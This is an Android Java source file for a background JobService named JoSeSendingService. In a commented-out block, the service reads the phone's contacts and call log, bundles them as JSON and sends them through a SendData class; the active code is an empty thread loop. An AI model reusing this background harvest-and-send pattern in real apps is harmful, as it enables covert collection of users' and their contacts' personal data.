package com.example.irec;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.os.Build;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.RequiresApi;

import com.google.gson.Gson;

import org.json.JSONObject;

import java.util.ArrayList;

@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class JoSeSendingService extends JobService {
    private boolean jobCancelled = false;
    @Override
    public boolean onStartJob(JobParameters params) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                Looper.prepare();
                if(jobCancelled) {
                    return;
                }
                /*GetContacts getContacts = new GetContacts(JoSeSendingService.this);
                getContacts.GetTempNames();
                String contactsStr = getContacts.getContacts();

                GetCalls getCalls =  new GetCalls(JoSeSendingService.this, "needLastData");
                String callsStr = getCalls.GetCallsData();


                ArrayList<String> dataList = new ArrayList<>();
                dataList.add(contactsStr);
                dataList.add( callsStr);
                String dataToSend = new Gson().toJson(dataList);

                SendData sendData = new SendData(dataToSend);
                sendData.send();

                Log.d("inside Service", "run: Job finished");
                jobFinished(params, false);*/


                Looper.loop();
            }
        }).start();


        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Log.d("stopJob", "onStopJob: Job cancelled before completion");
        jobCancelled=true;
        return true;
    }
}
